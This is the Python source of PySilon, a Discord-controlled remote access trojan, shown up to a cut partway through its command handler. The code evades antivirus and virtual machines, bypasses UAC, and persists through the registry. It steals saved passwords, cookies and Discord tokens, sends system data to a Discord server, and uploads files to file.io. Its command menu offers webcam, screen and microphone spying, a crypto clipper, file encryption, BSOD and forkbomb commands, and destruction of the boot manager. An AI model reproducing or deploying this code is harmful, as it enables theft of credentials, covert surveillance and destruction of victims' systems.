
import time
import os
from PIL import ImageGrab
from shutil import copy2, rmtree
import winreg
from zipfile import ZipFile
import requests
from filesplit.merge import Merge
from itertools import islice
from pathlib import Path
from cryptography.fernet import Fernet
import pickle
import psutil
from resources.discord_token_grabber import *
from resources.passwords_grabber import *
from browser_history import get_history
from resources.get_cookies import *
from urllib.request import urlopen
from threading import Thread
from scipy.io.wavfile import write
import sounddevice
from psutil import process_iter, Process
from win32process import GetWindowThreadProcessId
from win32gui import GetForegroundWindow
import pygame.camera
import pygame.image
import time
import pyautogui
import numpy as np
import imageio
from html2image import Html2Image
from PIL import Image
import ctypes
from resources.protections import protection_check, fake_mutex_code # [pysilon_mark] !anti-vm
from resources.discord_token_grabber import * # [pysilon_mark] !grabber
from resources.passwords_grabber import * # [pysilon_mark] !grabber
from urllib.request import urlopen
from resources.uac_bypass import *
from itertools import islice
from resources.misc import *
from getpass import getuser
from shutil import rmtree
import subprocess
import threading
import discord
import asyncio
import base64
import psutil
import json
import sys
import re
if protection_check(): # [pysilon_mark] !anti-vm
    os._exit(0) # [pysilon_mark] !anti-vm
if not IsAdmin():
    if GetSelf()[1]:
        if UACbypass():
            os._exit(0)
auto = 'auto'
bot_tokens = ['F5mNS1yTzNTcRF3cldUQ1MTdMhGO4EnTC5GcUZWRzVTW0QXUxQmLMVWayF3RucXTzkFRPlXQq1EeNR1T00EVONTVE9EeNRVT']
software_registry_name = 'File'
software_directory_name = 'File'
software_executable_name = 'File.exe'
channel_ids = {                                                    ##
    'info': True,
    'main': True,
    'spam': False,
    'file': True,
    'recordings': True,
    'voice': False
}                                                                  ##
secret_key = '10ce0b89bd7ac5623821ec2cb6b0df53c3a4e7ff4234cc5f7acbab9d85acb839'
guild_id = 1318575084192923749
if fake_mutex_code(software_executable_name.lower()) and os.path.basename(sys.executable).lower() != software_executable_name.lower(): # [pysilon_mark] !anti-vm
    os._exit(0) # [pysilon_mark] !anti-vm
if IsAdmin():
    exclusion_paths = [f'C:\\Users\\{getuser()}\\{software_directory_name}']
    for path in exclusion_paths:
        try:
            subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{path}"'], creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass
client = discord.Client(intents=discord.Intents.all())
ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
text_buffor, force_to_send = '', False
messages_to_send, files_to_send, embeds_to_send = [], [], []
processes_messages, processes_list, process_to_kill = [], [], ''
files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
cookies_thread, implode_confirmation, cmd_messages = None, None, []
send_recordings, input_blocked, clipper_stop, turned_off, custom_message_to_send = True, False, True, False, [None, None, None]
latest_messages_in_recordings = []
if IsAdmin(): regbase = winreg.HKEY_LOCAL_MACHINE
else: regbase = winreg.HKEY_CURRENT_USER
if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
    try:
        os.mkdir('C:\\Users\\' + getuser() + '\\' + software_directory_name)
    except:
        pass
    copy2(sys.argv[0], 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    registry = winreg.ConnectRegistry(None, regbase)
    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    winreg.CreateKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    registry_key = winreg.OpenKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
    winreg.SetValueEx(registry_key, software_registry_name, 0, winreg.REG_SZ, 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    winreg.CloseKey(registry_key)
    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', 'w', encoding='utf-8') as activator:
        process_name = sys.argv[0].split('\\')[-1]
        if IsAdmin(): attrib_value = "attrib +s +h ."
        else: attrib_value = "attrib +h ."
        activator.write(f'pushd "C:\\Users\\{getuser()}\\{software_directory_name}"\n{attrib_value}\nstart "" "{software_executable_name}"\ntaskkill /f /im "{process_name}"\ndel "%~f0"')
    subprocess.Popen(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', creationflags=subprocess.CREATE_NO_WINDOW)
    sys.exit(0)
working_directory = ['C:', 'Users', getuser(), software_directory_name]
@client.event
async def on_ready():
    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread, latest_messages_in_recordings
    hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID").decode().strip()
    first_run = True
    for category_name in client.get_guild(guild_id).categories:
        if hwid in str(category_name):
            first_run, category = False, category_name
            break
    if not first_run:
        category_channel_names = []
        for channel in category.channels:
            category_channel_names.append(channel.name)
        if 'spam' not in category_channel_names and channel_ids['spam']: 
            temp = await client.get_guild(guild_id).create_text_channel('spam', category=category)
            channel_ids['spam'] = temp.id
        if 'recordings' not in category_channel_names and channel_ids['recordings']: 
            temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category)
            channel_ids['recordings'] = temp.id
        if 'file-related' not in category_channel_names and channel_ids['file']: 
            temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category)
            channel_ids['file'] = temp.id
        if 'Live microphone' not in category_channel_names and channel_ids['voice']: 
            temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category)
            channel_ids['voice'] = temp.id
    if first_run:
        category = await client.get_guild(guild_id).create_category(hwid)
        temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
        temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
        if channel_ids['spam'] == True: temp = await client.get_guild(guild_id).create_text_channel('spam', category=category); channel_ids['spam'] = temp.id
        if channel_ids['recordings'] == True: temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category); channel_ids['recordings'] = temp.id
        if channel_ids['file'] == True: temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category); channel_ids['file'] = temp.id
        if channel_ids['voice'] == True: temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id
        try: 
            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ident.me').read().decode('utf-8') + ' [ident.me]```')
        except: pass
        try:
            await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8') + ' [lafibre.info]```')
        except: pass
        system_info = force_decode(subprocess.run('systeminfo', capture_output= True, shell= True).stdout).strip().replace('\\xff', ' ')
        chunk = ''
        for line in system_info.split('\n'):
            if len(chunk) + len(line) > 1990:
                await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
                chunk = line + '\n'
            else:
                chunk += line + '\n'
        await client.get_channel(channel_ids['info']).send('```' + chunk + '```')
        accounts = grab_discord.initialize(False) # [pysilon_mark] !grabber
        for account in accounts: # [pysilon_mark] !grabber
            reaction_msg = await client.get_channel(channel_ids['info']).send(embed=account); await reaction_msg.add_reaction('📌') # [pysilon_mark] !grabber
        result = grab_passwords() # [pysilon_mark] !grabber
        embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff) # [pysilon_mark] !grabber
        for url in result.keys(): # [pysilon_mark] !grabber
            embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False) # [pysilon_mark] !grabber
        reaction_msg = await client.get_channel(channel_ids['info']).send(embed=embed); await reaction_msg.add_reaction('📌') # [pysilon_mark] !grabber
    else:
        for channel in category.channels:
            if channel.name == 'info':
                channel_ids['info'] = channel.id
            elif channel.name == 'main':
                channel_ids['main'] = channel.id
            elif channel.name == 'spam':
                channel_ids['spam'] = channel.id
            elif channel.name == 'file-related':
                channel_ids['file'] = channel.id
            elif channel.name == 'recordings':
                channel_ids['recordings'] = channel.id
            elif channel.name == 'Live microphone':
                channel_ids['voice'] = channel.id
    await client.get_channel(channel_ids['main']).send(f"_ _\n_ _\n_ _```Starting new PC session at {current_time(True)} on HWID:{str(hwid)}{' && Bypassed UAC!' if IsAdmin() else ''}```\n_ _\n_ _\n_ _")
    recordings_obj = client.get_channel(channel_ids['recordings'])
    async for latest_message in recordings_obj.history(limit=2):
        latest_messages_in_recordings.append(latest_message.content)
    if 'disable' not in latest_messages_in_recordings:
        Thread(target=start_recording).start()
        await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Started recording...`')
        latest_messages_in_recordings = []
    else:
        Thread(target=start_recording).start()
        await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Recording disabled. If you want to enable it, just delete the "disable" message on` <#' + str(channel_ids['recordings']) + '>')
        latest_messages_in_recordings = []
    threading.Thread(target=process_blacklister).start()
    while True:
        global send_recordings
        recordings_obj = client.get_channel(channel_ids['recordings'])
        async for latest_message in recordings_obj.history(limit=2):
            latest_messages_in_recordings.append(latest_message.content)
        if 'disable' in latest_messages_in_recordings:
            send_recordings = False
        else:
            send_recordings = True
        latest_messages_in_recordings = []
        if len(messages_to_send) > 0:
            for message in messages_to_send:
                await client.get_channel(message[0]).send(message[1])
                await asyncio.sleep(0.1)
            messages_to_send = []
        if len(files_to_send) > 0:
            for file in files_to_send:
                await client.get_channel(file[0]).send(file[1], file=discord.File(file[2], filename=file[2]))
                await asyncio.sleep(0.1)
                if file[3]:
                    subprocess.run('del ' + file[2], shell=True)
            files_to_send = []
        if len(embeds_to_send) > 0:
            for embedd in embeds_to_send:
                if len(embedd) == 3:
                    await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1], color=0x0084ff).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
                else:
                    await client.get_channel(embedd[0]).send(embed=embedd[1])
                await asyncio.sleep(0.1)
            embeds_to_send = []
        await asyncio.sleep(1)
@client.event
async def on_raw_reaction_add(payload):
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    user = payload.member
    if user.bot == False:
        if str(reaction) == '📌':
            if message.channel.id in channel_ids.values():
                await message.pin()
                last_message = await discord.utils.get(message.channel.history())
                await last_message.delete()
        elif str(reaction) == '🔴':
            await message.delete()
@client.event
async def on_reaction_add(reaction, user):
    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages, process_to_kill, expectation, cmd_messages, custom_message_to_send
    if user.bot == False:
        if reaction.message.channel.id in channel_ids.values():
            try:
                if str(reaction) == '💀' and expectation == 'implosion':
                    await reaction.message.channel.send('```PySilon will try to implode after sending this message. So if there\'s no more messages, the cleanup was successful.```')
                    registry = winreg.ConnectRegistry(None, regbase)
                    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
                    registry_key = winreg.OpenKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
                    winreg.DeleteValue(registry_key, software_registry_name)
                    secure_delete_file(f'C:\\Users\\{getuser()}\\{software_directory_name}\\PySilon.key', 10)
                    try:
                        rmtree('rec_')
                    except:
                        pass
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
                    with open(f'C:\\Users\\{getuser()}\\implode.bat', 'w', encoding='utf-8') as imploder:
                        if IsAdmin(): attrib_value = f'attrib -s -h "C:\\Users\\{getuser()}\\{software_directory_name}"'
                        else: attrib_value = f'attrib -h "C:\\Users\\{getuser()}\\{software_directory_name}"'
                        imploder.write(f'pushd "C:\\Users\\{getuser()}"\n{attrib_value}\ntaskkill /f /im "{software_executable_name}"\ntimeout /t 3 /nobreak\nrmdir /s /q "C:\\Users\\{getuser()}\\{software_directory_name}"\ndel "%~f0"')
                    subprocess.Popen(f'C:\\Users\\{getuser()}\\implode.bat', creationflags=subprocess.CREATE_NO_WINDOW)
                    sys.exit(0)
                elif str(reaction) == '🔴' and expectation == 'implosion':
                    expectation = None
                elif str(reaction) == '📤':
                    if expectation == 'onefile':
                        split_v1 = str(one_file_attachment_message.attachments).split("filename='")[1]
                        filename = str(split_v1).split("' ")[0]
                        await one_file_attachment_message.attachments[0].save(fp='/'.join(working_directory) + '/' + filename)
                        async for message in reaction.message.channel.history(limit=2):
                            await message.delete()
                        await reaction.message.channel.send('```Uploaded  ' + filename + '  into  ' + '/'.join(working_directory) + '/' + filename + '```')
                        expectation = None
                    elif expectation == 'multiplefiles':
                        try: os.mkdir('temp')
                        except: rmtree('temp'); os.mkdir('temp')
                        await files_to_merge[0][-1].edit(content='```Uploading file 1 of ' + str(len(files_to_merge[1])) + '```')
                        for i in range(len(files_to_merge[1])):
                            split_v1 = str(files_to_merge[1][i].attachments).split("filename='")[1]
                            filename = str(split_v1).split("' ")[0]
                            await files_to_merge[1][i].attachments[0].save(fp='temp/' + filename)
                            await files_to_merge[0][-1].edit(content='```Uploading file ' + str(i+1) + ' of ' + str(len(files_to_merge[1])) + '```')
                        await files_to_merge[0][-1].edit(content='```Uploading completed```')
                        for i in os.listdir('temp'):
                            if i != 'manifest':
                                os.rename('temp/' + i, 'temp/' + i[:-8])
                        Merge('temp', '/'.join(working_directory), files_to_merge[2]).merge(cleanup=True)
                        rmtree('temp')
                        async for message in client.get_channel(channel_ids['file']).history():
                            await message.delete()
                        await reaction.message.channel.send('```Uploaded  ' + files_to_merge[2] + '  into  ' + '/'.join(working_directory) + '/' + files_to_merge[2] + '```')
                        files_to_merge = [[], [], []]
                        expectation = None
                elif str(reaction) == '🔴' and reaction.message.content[:15] == '```End of tree.':
                    for i in tree_messages:
                        try:
                            await i.delete()
                        except:
                            pass
                    tree_messages = []
                    subprocess.run('del ' + f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt', shell=True)
                elif str(reaction) == '📥' and reaction.message.content[:15] == '```End of tree.':
                    await reaction.message.channel.send(file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt'))
                    subprocess.run('del ' + f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt', shell=True)
                elif str(reaction) == '💀' and reaction.message.content[:39] == '```Do you really want to kill process: ':
                    await reaction.message.delete()
                    try:
                        process_name = process_to_kill[0]
                        if process_name[-1] == ']':
                            process_name = process_name[::-1]
                            for i in range(len(process_name)):
                                if process_name[i] == '[':
                                    process_name = process_name[i+4:]
                                    break
                            process_name = process_name[::-1]
                    except Exception as e:
                        embed = discord.Embed(title="📛 Error",description=f'```Error while parsing the process name...\n' + str(e) + '```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await reaction.message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
                    try:
                        killed_processes = []
                        for proc in process_iter():
                            if proc.name() == process_name:
                                proc.kill()
                                killed_processes.append(proc.name())
                        processes_killed = ''
                        for i in killed_processes:
                            processes_killed = processes_killed + '\n• ' + str(i)
                        embed = discord.Embed(title="🟢 Success",description=f'```Processes killed by ' + str(user) + ' at ' + current_time() + processes_killed + '```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await reaction.message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
                    except Exception as e:
                        embed = discord.Embed(title="📛 Error",description='```Error while killing processes...\n' + str(e) + '```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await reaction.message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
                elif str(reaction) == '🔴' and reaction.message.content[-25:] == '.kill <process-number>```':
                    for i in processes_messages:
                        try: await i.delete()
                        except: pass
                    processes_messages = []
                elif str(reaction) == '🔴' and reaction.message.content == '```End of command stdout```':
                    for i in cmd_messages:
                        await i.delete()
                    cmd_messages = []
                elif str(reaction) == '✅':
                    if custom_message_to_send[0] != None:
                        threading.Thread(target=send_custom_message, args=(custom_message_to_send[0], custom_message_to_send[1], custom_message_to_send[2],)).start()
                        await asyncio.sleep(0.5)
                        ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
                        reaction_msg = await reaction.message.channel.send(embed=discord.Embed(title=current_time() + ' `[Sent message]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
                        await reaction_msg.add_reaction('📌')
                        subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png', shell=True)
            except Exception as err:
                await reaction.message.channel.send(f'```{str(err)}```')
@client.event
async def on_raw_reaction_remove(payload):
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    user = payload.member
    if str(reaction) == '📌':
        await message.unpin()
help = {
    'commands': {
        'ss': ['➡️ `.ss`', 'Takes a screenshot of the victim\'s PC'],
        'screenrec': ['➡️ `.screenrec`', 'Records the screen of the victim\'s PC for 15 seconds'],
        'join': ['➡️ `.join`', 'Makes the BOT join a voice channel and live-stream microphone input'],
        'show': ['➡️ `.show <what-to-show>`', 'Displays information about specified subject. Options:\n🔹processes - displays all running processes'],
        'kill': ['➡️ `.kill <process-name>`', 'Kills a specified process. Options:\n🔹process-name - kills a specific process based on .show generated process-names'],
        'block-input': ['➡️ `.block-input`', 'Blocks keyboard and mouse inputs of the victim\'s PC'],
        'unblock-input': ['➡️ `.unblock-input`', 'Unblocks keyboard and mouse inputs of the victim\'s PC'],
        'start-clipper': ['➡️ `.start-clipper`', 'Starts the Crypto Clipper thread on the victim\'s PC'],
        'stop-clipper': ['➡️ `.stop-clipper`', 'Stops the Crypto Clipper thread on the victim\'s PC'],
        'set-critical': ['➡️ `.set-critical`', 'Elevates the process to critical status.'],
        'unset-critical': ['➡️ `.unset-critical`', 'Removes the critical status from the process.'],
        'grab': ['➡️ `.grab <what-to-grab>`', 'Grabs specified information. Options:\n🔹passwords - grabs all browser-saved passwords\n🔹history - grabs the browser history\n🔹cookies - grabs browser-cookies\n🔹wifi - grabs all WiFi saved passwords\n🔹discord - grabs all possible information from victim\'s Discord account\n🔹all - grabs discord information, passwords & cookies'],
        'clear': ['➡️ `.clear`', 'Clears all messages on the file-related channel'],
        'pwd': ['➡️ `.pwd`', 'Displays current directory path'],
        'ls': ['➡️ `.ls`', 'Lists current directory content'],
        'cd': ['➡️ `.cd <directory>`', 'Changes working directory. Options:\n🔹directory - the destination directory (.. is the previous directory)'],
        'tree': ['➡️ `.tree`', 'Displays the current directory\'s structure'],
        'download': ['➡️ `.download <file-or-directory-name>`', 'Downloads specified file or folder. Options:\n🔹file-or-directory-name - name of file or directory that you want to download'],
        'upload': ['➡️ `.upload <type> <name>`', 'Uploads a file to victim\'s PC. Options:\n🔹type - single/multiple files whether it\'s smaller or larger than 25MB (single=smaller, multiple=larger)\n🔹name - name of uploaded file on victim\'s PC'],
        'execute': ['➡️ `.execute <file-name>`', 'Execute specified file on the victim\'s PC'],
        'remove': ['➡️ `.remove <file-or-directory-name>`', 'Removes the specified file or directory. Options:\n🔹file-or-directory-name - name of file or directory that you want to remove'],
        'key': ['➡️ `.key <what-to-type>`', 'Simulates typing on the victim\'s PC. Options:\n🔹ALTF4 - performs the Alt+F4 shortcut\n🔹ALTTAB - performs the Alt+Tab shortcut'],
    },
    'commands2': {
        'blacklist': ['➡️ `.blacklist <process-name>`', 'Adds the specified process to the blacklist.'],
        'whitelist': ['➡️ `.whitelist <process-name>`', 'Removes the specified process from the blacklist.'],
        'turnoff': ['➡️ `.turnoff`', 'Turns all monitors off'],
        'turnon': ['➡️ `.turnon`', 'Turns all monitors on'],
        'block-website': ['➡️ `.block-website <url>`', 'Blocks the specified website from being accessed from any browser.'],
        'unblock-website': ['➡️ `.unblock-website <url>`', 'Unblocks access to a previously blocked website.'],
        'webcam': ['➡️ `.webcam photo`', 'Takes a photo of a victim\'s webcam (if one is detected)'],
        'forkbomb': ['➡️ `.forkbomb`', 'Creates a self-replicating process until the victim\'s PC crashes.'],
        'volume': ['➡️ `.volume`', 'Change the speaker volume on the victim\'s PC.'],
        'play': ['➡️ `.play`', 'Play any .mp3 file on the victim\'s PC.'],
        'tts': ['➡️ `.tts <message>`', 'Plays a Text-to-Speech voice message.'],
        'msg': ['➡️ `.msg <parameters>`', 'Displays a custom message box to the victim\'s PC. Parameters:\n🔹text="" - The main text of the msg box\n🔹title="" - The title of the msg box\n🔹style="" - The msg box style (1, 2, 3, 4, 5, 6)'],
        'cmd': ['➡️ `.cmd <command>`', 'Executes specified Command Prompt command on the victim\'s PC and sends back the output. Options:\n🔹command - a CMD command that will be executed on victim\'s PC'],
        'bsod': ['➡️ `.bsod`', 'Triggers a Blue Screen of Death on the victim\'s PC.'],
        'jumpscare': ['➡️ `.jumpscare`', 'Plays a very loud & rapidly flashing video.'],
        'break-windows': ['➡️ `.break-windows`', 'Destroys Windows by renaming the boot manager. (Dangerous)'],
        'disable-reset': ['➡️ `.disable-reset`', 'Disables windows recovery (ReAgentC)'],
        'enable-reset': ['➡️ `.enable-reset`', 'Enables windows recovery (ReAgentC)'],
        'encrypt': ['➡️ `.encrypt <directory>`', 'Encrypts every file in the specified directory'],
        'decrypt': ['➡️ `.decrypt <directory>`', 'Decrypts every file in the specified directory'],
        'implode': ['➡️ `.implode`', 'Entirely wipes the malware off of the victim\'s PC (to remove traces).']
    }
}
@client.event
async def on_message(message):
    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, clipper_stop, input_blocked, custom_message_to_send, turned_off
    if message.author != client.user:
        if message.content == f'<@{client.user.id}>':
            await client.get_channel(channel_ids['main']).send(f'<@{message.author.id}>')
        if message.channel.id in channel_ids.values():
            if message.content == '.implode':
                await message.delete()
                await message.channel.send('``` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` ```\n\n```Send here PySilon.key generated along with RAT executable```\n\n')
                expectation = 'key'
            elif message.content == '.restart':
                await message.delete()
                await message.channel.send('```PySilon will be restarted now... Stand by...```')
                os.startfile(f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}')
                sys.exit(0)
            elif message.content[:5] == '.help':
                await message.delete()
                if message.content.strip() == '.help':
                    embed = discord.Embed(title='List of all available commands', color=0x49fc03)
                    for i in help['commands'].keys():
                        embed.add_field(name=help['commands'][i][0], value=help['commands'][i][1], inline=False)
                    await message.channel.send(embed=embed)
                    embed = discord.Embed(color=0x49fc03)
                    for i in help['commands2'].keys():
                        embed.add_field(name=help['commands2'][i][0], value=help['commands2'][i][1], inline=False)
                    await message.channel.send(embed=embed)
            elif message.content == '.set-critical':
                await message.delete()
                try:
                    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
                    embed = discord.Embed(title="🟣 System",description=f'```Process elevated to critical status successfully.\nWarning: This critical process can cause of BSOD when the victim tries to shut down their system.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                except: 
                    await message.channel.send('`Something went wrong while elevating the process`')
            elif message.content == '.unset-critical':
                await message.delete()
                try:
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
                    embed = discord.Embed(title="🟣 System",description=f'```Successfully removed critical status from process.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                except: 
                    await message.channel.send('`Something went wrong while removing critical status`')
            elif message.content == '.disable-reset':
                await message.delete()
                if IsAdmin():
                    subprocess.run('reagentc.exe /disable', creationflags=subprocess.CREATE_NO_WINDOW)
                    embed = discord.Embed(title="🟣 System",description=f'```Successfully disabled REAgentC.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    embed = discord.Embed(title="📛 Error",description=f'```Disabling REAgentC requires elevation.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content == '.enable-reset':
                await message.delete()
                if IsAdmin():
                    subprocess.run('reagentc.exe /enable', creationflags=subprocess.CREATE_NO_WINDOW)
                    embed = discord.Embed(title="🟣 System",description=f'```Successfully enabled REAgentC.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    embed = discord.Embed(title="📛 Error",description=f'```Enabling REAgentC requires elevation.```', colour=discord.Colour.purple())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif expectation == 'key':
                try:
                    split_v1 = str(message.attachments).split("filename='")[1]
                    filename = str(split_v1).split("' ")[0]
                    filename = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + filename
                    await message.attachments[0].save(fp=filename)
                    if get_file_hash(filename) == secret_key:
                        reaction_msg = await message.channel.send('```You are authorized to remotely remove PySilon RAT from target PC. Everything related to PySilon will be erased after you confirm this action by reacting with "💀".\nWARNING! This cannot be undone after you decide to proceed. You can cancel it, by reacting with "🔴".```')
                        await reaction_msg.add_reaction('💀')
                        await reaction_msg.add_reaction('🔴')
                        expectation = 'implosion'
                    else:
                        reaction_msg = await message.channel.send('```❗ Provided key is invalid```'); await reaction_msg.add_reaction('🔴')
                        expectation = None
                except Exception as err: 
                    await message.channel.send(f'```❗ Something went wrong while fetching secret key...\n{str(err)}```')
                    expectation = None
            elif message.content == '.ss':
                await message.delete()
                ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
                reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
                await reaction_msg.add_reaction('📌')
                subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png', shell=True)
            elif message.content[:9] == '.download':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    if message.content == '.download':
                        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .download <file-or-directory>```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    else:
                        if os.path.exists('/'.join(working_directory) + '/' + message.content[10:]):
                            target_file = '/'.join(working_directory) + '/' + message.content[10:]
                            if os.path.isdir(target_file):
                                target_file += '.zip'
                                with ZipFile(target_file,'w') as zip:
                                    for file in get_all_file_paths('.'.join(target_file.split('.')[:-1])):
                                        try:
                                            zip.write(file)
                                        except Exception as e:
                                            message.channel.send(e)
                                            pass
                            await message.channel.send("```Uploading to file.io... This can take a while depending on the file size, amount and the victim's internet speed..```")
                            data = {
                                'file': open(target_file, 'rb')
                            }
                            url = 'https://file.io/'
                            response = requests.post(url, files=data)
                            data = response.json()
                            embed = discord.Embed(title=f"🟢 {message.content[10:]}",description=f"Click [here](<{data['link']}>) to download.", colour=discord.Colour.green())
                            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                            await message.channel.send(embed=embed)
                            await message.channel.send('Warning: The file will be removed from file.io right after the first download.')
                        else:
                            embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=discord.Colour.red())
